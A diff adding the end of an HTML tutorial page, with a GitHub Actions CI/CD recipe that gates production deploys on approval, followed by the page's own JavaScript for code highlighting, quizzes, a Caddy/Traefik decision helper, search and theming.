+          tags: ${{ steps.meta.outputs.tag }}
+  deploy-staging:
+    needs: image
+    runs-on: ubuntu-latest
+    environment: staging
+    steps:
+      - run: echo &quot;Deploying ${{ needs.image.outputs.tag }} to staging&quot;
+  deploy-production:
+    needs: [image, deploy-staging]
+    runs-on: ubuntu-latest
+    environment: production            # protected: requires reviewer approval before running
+    steps:
+      - run: echo &quot;Deploying ${{ needs.image.outputs.tag }} to production&quot;
+</code></pre>
+<p>Read it as a flow: <code>test</code> → <code>image</code> (build, push, expose the tag as a job output) → <code>deploy-staging</code> → <code>deploy-production</code>. The only manual step is approving the production environment; everything else is automatic and repeatable. Combine it with Recipe 3's provenance and Recipe 1's PR gate and you have a pipeline that is fast, safe, and auditable — exactly the three properties from Part 1: a tight feedback loop, repeatability, and an enforceable gate.</p>
+<p>That's the guide. From here the highest-leverage next steps are the three from Part 7 that most improve a real pipeline: default <code>permissions</code> to read-only, SHA-pin your actions, and move cloud deploys to OIDC.</p></main>
+</div>
+<button id="toTop" aria-label="Back to top">
+  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+</button>
+<script>
+(function(){
+  'use strict';
+  var ESC={'&':'&amp;','<':'&lt;','>':'&gt;'};
+  function esc(s){return s.replace(/[&<>]/g,function(c){return ESC[c];});}
+
+  /* ---------- lightweight syntax highlighting ---------- */
+  // Generic token-rule engine. Each rule: {re, cls}. First match at pos wins.
+  function tokenize(src, rules){
+    var out='', i=0, n=src.length, guard=0;
+    while(i<n && guard++<200000){
+      var matched=false;
+      for(var r=0;r<rules.length;r++){
+        rules[r].re.lastIndex=i;
+        var m=rules[r].re.exec(src);
+        if(m && m.index===i && m[0].length>0){
+          out+= rules[r].cls? '<span class="'+rules[r].cls+'">'+esc(m[0])+'</span>' : esc(m[0]);
+          i+=m[0].length; matched=true; break;
+        }
+      }
+      if(!matched){ out+=esc(src[i]); i++; }
+    }
+    if(i<n) out+=esc(src.slice(i));
+    return out;
+  }
+  var DIRECTIVES=('reverse_proxy file_server root encode header redir rewrite respond tls log '
+    +'basic_auth forward_auth handle handle_path handle_errors import route uri templates '
+    +'try_files metrics tracing request_body skip_log map vars push bind').split(' ');
+  var GLOBALS=('email acme_ca admin default_sni order debug auto_https on_demand_tls servers '
+    +'storage grace_period http_port https_port').split(' ');
+  function caddyRules(){
+    var dir='\\b(?:'+DIRECTIVES.concat(GLOBALS).join('|')+')\\b';
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/\{[^{}\n]*\}/g, cls:'ph'},          // placeholders {http.request.host}
+      {re:/@[A-Za-z0-9_-]+/g, cls:'m'},        // named matchers
+      {re:new RegExp(dir,'g'), cls:'k'},
+      {re:/\b\d+(?:\.\d+)?(?:ms|s|m|h|d|[KMGT]i?B?)?\b/g, cls:'n'},
+      {re:/^[ \t]*(?:https?:\/\/)?[A-Za-z0-9*][A-Za-z0-9.\-*]*\.[A-Za-z][A-Za-z0-9.\-:]*(?=[ ,{])/gm, cls:'site'},
+      {re:/[:|]\d{2,5}\b/g, cls:'site'},
+      {re:/[{}]/g, cls:'p'}
+    ];
+  }
+  function bashRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/'(?:[^'\\]|\\.)*'/g, cls:'s'},
+      {re:/\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*/g, cls:'ph'},
+      {re:/\b(sudo|curl|apt|dnf|brew|pacman|scoop|choco|go|xcaddy|caddy|systemctl|journalctl|docker|openssl|ulimit|export|chmod|mv|tee|gpg)\b/g, cls:'k'},
+      {re:/\s-{1,2}[A-Za-z][\w-]*/g, cls:'n'}
+    ];
+  }
+  function jsonRules(){
+    return [
+      {re:/"(?:[^"\\]|\\.)*"(?=\s*:)/g, cls:'a'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/\b(true|false|null)\b/g, cls:'b'},
+      {re:/-?\b\d+(?:\.\d+)?\b/g, cls:'n'},
+      {re:/[{}\[\],:]/g, cls:'p'}
+    ];
+  }
+  var NGINX_KW=('http events main stream upstream server location map geo types charset_map split_clients '
+    +'listen server_name root alias index autoindex try_files return rewrite error_page internal default_type '
+    +'include set if set_real_ip_from real_ip_header real_ip_recursive '
+    +'proxy_pass proxy_set_header proxy_http_version proxy_buffering proxy_buffers proxy_buffer_size '
+    +'proxy_cache proxy_cache_path proxy_cache_valid proxy_cache_key proxy_cache_use_stale proxy_cache_lock '
+    +'proxy_read_timeout proxy_connect_timeout proxy_send_timeout proxy_redirect proxy_ssl_server_name proxy_pass_request_headers '
+    +'fastcgi_pass fastcgi_param fastcgi_cache fastcgi_index scgi_pass uwsgi_pass grpc_pass '
+    +'ssl_certificate ssl_certificate_key ssl_protocols ssl_ciphers ssl_prefer_server_ciphers ssl_session_cache '
+    +'ssl_session_timeout ssl_session_tickets ssl_stapling ssl_stapling_verify ssl_dhparam ssl_early_data ssl_trusted_certificate '
+    +'resolver resolver_timeout http2 http3 quic '
+    +'gzip gzip_types gzip_comp_level gzip_min_length gzip_vary gzip_proxied brotli brotli_types brotli_comp_level '
+    +'add_header add_trailer expires etag sendfile sendfile_max_chunk tcp_nopush tcp_nodelay keepalive_timeout keepalive keepalive_requests '
+    +'worker_processes worker_connections worker_rlimit_nofile worker_priority multi_accept use pid user '
+    +'client_max_body_size client_body_buffer_size client_body_timeout client_header_timeout large_client_header_buffers send_timeout '
+    +'limit_req limit_req_zone limit_req_status limit_conn limit_conn_zone limit_conn_status limit_rate limit_rate_after '
+    +'access_log error_log log_format open_log_file_cache stub_status open_file_cache open_file_cache_valid '
+    +'allow deny auth_basic auth_basic_user_file satisfy auth_request '
+    +'least_conn ip_hash hash zone server weight max_fails fail_timeout backup down slow_start '
+    +'absolute_redirect server_tokens merge_slashes underscores_in_headers types_hash_max_size variables_hash_max_size').split(' ');
+  var NGINX_CONST=('on off break last permanent redirect reuseport ssl default_server deferred '
+    +'spdy fastopen rcvbuf sndbuf').split(' ');
+  function nginxRules(){
+    var kw='\\b(?:'+NGINX_KW.join('|')+')\\b';
+    var cn='\\b(?:'+NGINX_CONST.join('|')+')\\b';
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, cls:'s'},
+      {re:/\$\{?[A-Za-z_][A-Za-z0-9_]*\}?/g, cls:'ph'},
+      {re:new RegExp(kw,'g'), cls:'k'},
+      {re:new RegExp(cn,'g'), cls:'b'},
+      {re:/~\*?|\^~|=(?=\s)/g, cls:'m'},
+      {re:/\b\d+(?:\.\d+)*(?:ms|[smhdMG]|k|m|g)?\b/g, cls:'n'},
+      {re:/[{};]/g, cls:'p'}
+    ];
+  }
+  function yamlRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, cls:'s'},
+      {re:/^[ \t-]*[A-Za-z0-9_.\-]+(?=\s*:)/gm, cls:'a'},
+      {re:/\b(true|false|null|yes|no)\b/g, cls:'b'},
+      {re:/\b\d+(?:\.\d+)?\b/g, cls:'n'}
+    ];
+  }
+  function iniRules(){
+    return [
+      {re:/[#;][^\n]*/g, cls:'c'},
+      {re:/^\[[^\]\n]+\]/gm, cls:'k'},
+      {re:/^[A-Za-z0-9_.\-]+(?=\s*=)/gm, cls:'a'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'}
+    ];
+  }
+  function dockerRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/^\s*(FROM|RUN|COPY|CMD|ENV|EXPOSE|WORKDIR|ENTRYPOINT|ARG|LABEL|VOLUME|USER|AS)\b/gmi, cls:'k'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/\s-{1,2}[A-Za-z][\w-]*/g, cls:'n'}
+    ];
+  }
+  function defaultRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, cls:'s'}
+    ];
+  }
+  function rulesFor(lang){
+    switch(lang){
+      case 'caddyfile': case 'caddy': return caddyRules();
+      case 'bash': case 'sh': case 'shell': case 'console': case 'powershell': return bashRules();
+      case 'json': return jsonRules();
+      case 'nginx': return nginxRules();
+      case 'yaml': case 'yml': return yamlRules();
+      case 'ini': case 'toml': case 'systemd': return iniRules();
+      case 'dockerfile': case 'docker': return dockerRules();
+      case 'html': case 'xml': return defaultRules();
+      default: return null;
+    }
+  }
+  var LANGLABEL={caddyfile:'Caddyfile',caddy:'Caddyfile',bash:'bash',sh:'bash',shell:'bash',
+    console:'bash',powershell:'PowerShell',json:'JSON',nginx:'nginx',yaml:'YAML',yml:'YAML',
+    ini:'ini',toml:'TOML',systemd:'systemd',dockerfile:'Dockerfile',docker:'Dockerfile',
+    html:'HTML',text:'text'};
+
+  function enhanceCode(){
+    document.querySelectorAll('main pre > code').forEach(function(code){
+      var pre=code.parentNode;
+      if(pre.parentNode.classList && pre.parentNode.classList.contains('codewrap')) return;
+      var cls=code.className||'';
+      var lm=cls.match(/language-([\w-]+)/);
+      var lang=lm?lm[1].toLowerCase():'text';
+      var raw=code.textContent;
+      // highlight
+      var rules=rulesFor(lang);
+      if(rules){ try{ code.innerHTML=tokenize(raw,rules);}catch(e){ code.textContent=raw; } }
+      // wrap
+      var wrap=document.createElement('div'); wrap.className='codewrap';
+      var bar=document.createElement('div'); bar.className='codebar';
+      var label=document.createElement('span'); label.className='lang';
+      label.textContent=LANGLABEL[lang]||lang;
+      var btn=document.createElement('button'); btn.className='copybtn'; btn.type='button';
+      btn.innerHTML='<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+      btn.addEventListener('click',function(){
+        navigator.clipboard.writeText(raw).then(function(){
+          btn.classList.add('ok'); btn.querySelector('span').textContent='Copied';
+          setTimeout(function(){btn.classList.remove('ok');btn.querySelector('span').textContent='Copy';},1400);
+        });
+      });
+      bar.appendChild(label); bar.appendChild(btn);
+      pre.parentNode.insertBefore(wrap,pre);
+      wrap.appendChild(bar); wrap.appendChild(pre);
+    });
+  }
+
+  /* ---------- wrap tables for horizontal scroll ---------- */
+  function wrapTables(){
+    document.querySelectorAll('main table').forEach(function(t){
+      if(t.parentNode.classList.contains('tablewrap'))return;
+      var w=document.createElement('div'); w.className='tablewrap';
+      t.parentNode.insertBefore(w,t); w.appendChild(t);
+    });
+  }
+
+  /* ---------- scroll-spy + progress ---------- */
+  function setupSpy(){
+    var links=[].slice.call(document.querySelectorAll('.toc a'));
+    var map={}; links.forEach(function(a){map[a.dataset.target]=a;});
+    var heads=[].slice.call(document.querySelectorAll('main h2[id], main h3[id]'));
+    var prog=document.getElementById('progress');
+    function onScroll(){
+      var y=window.scrollY, h=document.documentElement;
+      var max=h.scrollHeight-h.clientHeight;
+      prog.style.width=(max>0?(y/max*100):0)+'%';
+      var cur=null;
+      for(var i=0;i<heads.length;i++){
+        if(heads[i].getBoundingClientRect().top<=90) cur=heads[i]; else break;
+      }
+      links.forEach(function(a){a.classList.remove('active');});
+      if(cur && map[cur.id]){
+        map[cur.id].classList.add('active');
+        var act=map[cur.id];
+        var sb=document.querySelector('.sidebar');
+        if(sb && act.offsetTop<sb.scrollTop || act.offsetTop>sb.scrollTop+sb.clientHeight-40){
+          // keep active link in view
+          sb.scrollTop=act.offsetTop-sb.clientHeight/2;
+        }
+      }
+      document.getElementById('toTop').classList.toggle('show',y>600);
+    }
+    window.addEventListener('scroll',onScroll,{passive:true});
+    onScroll();
+  }
+
+  /* ---------- collapsible parts (h2) ---------- */
+  function setupCollapse(){
+    document.querySelectorAll('main h2[id]').forEach(function(h){
+      h.addEventListener('click',function(e){
+        // ignore clicks on links inside heading
+        if(e.target.tagName==='A')return;
+        var collapsed=h.classList.toggle('collapsed');
+        var el=h.nextElementSibling;
+        while(el && el.tagName!=='H2'){
+          if(el.tagName==='HR'){el=el.nextElementSibling;continue;}
+          el.classList.toggle('collapsed-body',collapsed);
+          el=el.nextElementSibling;
+        }
+      });
+    });
+  }
+
+  /* ---------- quizzes ---------- */
+  function setupQuiz(){
+    document.querySelectorAll('.quiz-item').forEach(function(item){
+      var opts=[].slice.call(item.querySelectorAll('.quiz-opt'));
+      var explain=item.querySelector('.quiz-explain');
+      opts.forEach(function(opt){
+        opt.addEventListener('click',function(){
+          if(item.dataset.done)return;
+          item.dataset.done='1';
+          opts.forEach(function(o){
+            o.classList.add('locked');
+            if(o.dataset.correct==='true')o.classList.add('correct');
+          });
+          if(opt.dataset.correct!=='true')opt.classList.add('wrong');
+          if(explain)explain.hidden=false;
+        });
+      });
+    });
+  }
+
+  /* ---------- decision helper ---------- */
+  function setupDecision(){
+    var box=document.getElementById('decision-helper'); if(!box)return;
+    var out=document.getElementById('decision-out');
+    function compute(){
+      var w={caddy:0,against:0,traefik:0};
+      box.querySelectorAll('input:checked').forEach(function(c){
+        w[c.dataset.w]+=parseInt(c.value,10);
+      });
+      var verdict,cls,reasons;
+      if(w.caddy===0 && w.against===0 && w.traefik===0){
+        out.innerHTML='<span class="decision-verdict">Select options above for a recommendation.</span>';
+        return;
+      }
+      if(w.traefik>=2 && w.traefik>=w.caddy){
+        verdict='Consider Traefik'; cls='alt';
+        reasons='Docker-label auto-discovery is Traefik’s native strength. Caddy can do it with plugins, but if that’s a core requirement, Traefik is the cleaner fit.';
+      } else if(w.against>w.caddy){
+        verdict='Caddy is probably not the best fit'; cls='alt';
+        reasons='Your needs lean toward a specialist: HAProxy/Envoy for L4 or extreme scale, Nginx+ModSecurity or a cloud WAF for filtering, or sticking with a working Nginx setup. See Part 12.6.';
+      } else if(w.against>0 && w.caddy-w.against<=1){
+        verdict='Caddy works — with caveats'; cls='maybe';
+        reasons='Caddy fits most of your needs, but weigh the constraints you checked. For those specific concerns, a specialist tool may still be worth pairing in.';
+      } else {
+        verdict='Caddy is a strong fit'; cls='caddy';
+        reasons='Automatic HTTPS, a simple config, and a single dependency-free binary line up well with what you need. Start with the Caddyfile and reach for the JSON API only if you outgrow it.';
+      }
+      out.innerHTML='<span class="decision-verdict '+cls+'">'+verdict+'</span>'
+        +'<p class="decision-reasons">'+reasons+'</p>';
+    }
+    box.addEventListener('change',compute);
+  }
+
+  /* ---------- search ---------- */
+  function setupSearch(){
+    var input=document.getElementById('search');
+    var tocItems=[].slice.call(document.querySelectorAll('.toc li'));
+    function clearMarks(){
+      document.querySelectorAll('main mark.hit').forEach(function(m){
+        var t=document.createTextNode(m.textContent); m.parentNode.replaceChild(t,m);
+      });
+    }
+    var t;
+    input.addEventListener('input',function(){
+      clearTimeout(t); t=setTimeout(run,150);
+    });
+    function run(){
+      var q=input.value.trim().toLowerCase();
+      // filter TOC
+      tocItems.forEach(function(li){
+        var a=li.querySelector('a'); if(!a)return;
+        li.classList.toggle('hide', q!=='' && a.textContent.toLowerCase().indexOf(q)===-1);
+      });
+      clearMarks();
+      if(q.length<2)return;
+      // highlight in body (text nodes only, skip code/script)
+      var rx=new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi');
+      var walker=document.createTreeWalker(document.querySelector('main'),NodeFilter.SHOW_TEXT,{
+        acceptNode:function(node){
+          if(!node.nodeValue.trim())return NodeFilter.FILTER_REJECT;
+          var p=node.parentNode;
+          while(p && p!==document.body){
+            var tn=p.tagName;
+            if(tn==='CODE'||tn==='PRE'||tn==='SCRIPT'||tn==='STYLE'||tn==='MARK')return NodeFilter.FILTER_REJECT;
+            p=p.parentNode;
+          }
+          return rx.test(node.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;
+        }
+      });
+      var nodes=[],nd; while(nd=walker.nextNode())nodes.push(nd);
+      var count=0;
+      nodes.forEach(function(node){
+        if(count>400)return;
+        var frag=document.createDocumentFragment(); var last=0,s=node.nodeValue; rx.lastIndex=0; var m;
+        while((m=rx.exec(s))){
+          frag.appendChild(document.createTextNode(s.slice(last,m.index)));
+          var mk=document.createElement('mark'); mk.className='hit'; mk.textContent=m[0];
+          frag.appendChild(mk); last=m.index+m[0].length; count++;
+          if(m.index===rx.lastIndex)rx.lastIndex++;
+        }
+        frag.appendChild(document.createTextNode(s.slice(last)));
+        node.parentNode.replaceChild(frag,node);
+      });
+    }
+  }
+
+  /* ---------- theme + mobile nav + shortcuts ---------- */
+  function setupChrome(){
+    var root=document.documentElement;
+    var saved=localStorage.getItem('caddy-theme');
+    if(saved)root.setAttribute('data-theme',saved);
+    document.getElementById('themeBtn').addEventListener('click',function(){
+      var cur=root.getAttribute('data-theme')==='light'?'dark':'light';
+      root.setAttribute('data-theme',cur); localStorage.setItem('caddy-theme',cur);
+    });
+    var sb=document.querySelector('.sidebar'), scrim=document.querySelector('.scrim');
+    function close(){sb.classList.remove('open');scrim.classList.remove('show');}
+    document.getElementById('menuBtn').addEventListener('click',function(){
+      sb.classList.toggle('open');scrim.classList.toggle('show');
+    });
+    scrim.addEventListener('click',close);
+    sb.addEventListener('click',function(e){if(e.target.tagName==='A')close();});
+    document.getElementById('toTop').addEventListener('click',function(){
+      window.scrollTo({top:0,behavior:'smooth'});
+    });
+    document.addEventListener('keydown',function(e){
+      if(e.key==='/'&&document.activeElement.id!=='search'){e.preventDefault();document.getElementById('search').focus();}
+      else if(e.key==='Escape'){close();document.getElementById('search').blur();}
+      else if(e.key==='t'&&document.activeElement.tagName!=='INPUT'){document.getElementById('themeBtn').click();}
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded',function(){
+    enhanceCode(); wrapTables(); setupSpy(); setupCollapse();
+    setupQuiz(); setupDecision(); setupSearch(); setupChrome();
+  });
+})();
+</script>
+</body>
+</html>
